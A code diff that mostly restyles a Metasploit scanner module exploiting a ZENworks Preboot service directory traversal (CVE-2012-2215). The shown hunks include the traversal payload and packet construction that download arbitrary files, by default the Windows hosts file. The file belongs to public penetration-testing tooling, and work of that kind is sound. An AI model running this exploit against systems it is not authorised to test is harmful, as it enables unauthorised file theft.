@@ -9,34 +9,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Novell ZENworks Configuration Management Preboot Service Remote File Access',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Novell ZENworks Configuration Management Preboot Service Remote File Access',
+        'Description' => %q{
           This module exploits a directory traversal in the ZENworks Configuration Management.
-        The vulnerability exists in the Preboot service and can be triggered by sending a specially
-        crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been
-        successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          The vulnerability exists in the Preboot service and can be triggered by sending a specially
+          crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been
+          successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Luigi Auriemma', # Vulnerability Discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2012-2215' ],
           [ 'OSVDB', '80230' ],
           [ 'URL', 'https://web.archive.org/web/20121103122235/http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(998),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '\\WINDOWS\\system32\\drivers\\etc\\hosts']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 6])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -51,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     travs << datastore['FILEPATH']
 
     payload = Rex::Text.to_unicode(travs)
-    packet =  [0x21].pack("N") # Opcode
+    packet = [0x21].pack("N") # Opcode
     packet << [payload.length].pack("N") # Length
     packet << payload # Value
 
@@ -65,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    sock.get_once(0x210-8, 1)
+    sock.get_once(0x210 - 8, 1)
     contents = sock.get_once(length.unpack("V").first, 1)
 
     unless contents
